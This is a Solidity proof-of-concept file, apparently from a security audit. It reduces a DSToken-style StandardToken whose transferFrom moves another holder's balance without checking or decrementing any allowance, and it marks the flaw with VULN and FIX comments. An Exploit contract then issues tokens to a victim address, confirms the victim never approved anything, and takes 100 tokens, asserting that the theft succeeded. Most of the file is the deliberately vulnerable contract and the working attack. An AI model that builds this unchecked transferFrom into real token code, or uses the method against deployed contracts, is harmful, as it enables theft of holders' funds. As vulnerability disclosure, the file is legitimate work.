// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/* Securitize DSToken rebasing — a transferFrom caller needs no approval (#64373).
   This is a local reduction of StandardToken::transferFrom. */
contract StandardToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function issueTokens(address investor, uint256 amount) external { balanceOf[investor] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    function _transfer(address from, address to, uint256 value) internal {
        balanceOf[from] -= value;
        balanceOf[to] += value;
    }

    // Faithful behavioral reduction: no allowance read/decrement occurs here.
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool) {
        // FIX: allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value); // @> VULN: transferFrom moves another investor's balance without checking spending approval.
        return true;
    }
}

contract Exploit {
    StandardToken public dsToken; // CREATE nonce 1 (vulnerable)
    address public constant VICTIM = address(0xBEEF);
    uint256 public constant STOLEN = 100;

    constructor() { dsToken = new StandardToken(); }

    function run() external {
        dsToken.issueTokens(VICTIM, 500);
        require(dsToken.allowance(VICTIM, address(this)) == 0, "victim unexpectedly approved");
        dsToken.transferFrom(VICTIM, address(this), STOLEN);
        require(dsToken.balanceOf(address(this)) == STOLEN, "theft failed");
        require(dsToken.balanceOf(VICTIM) == 400, "victim loss not shown");
    }
}
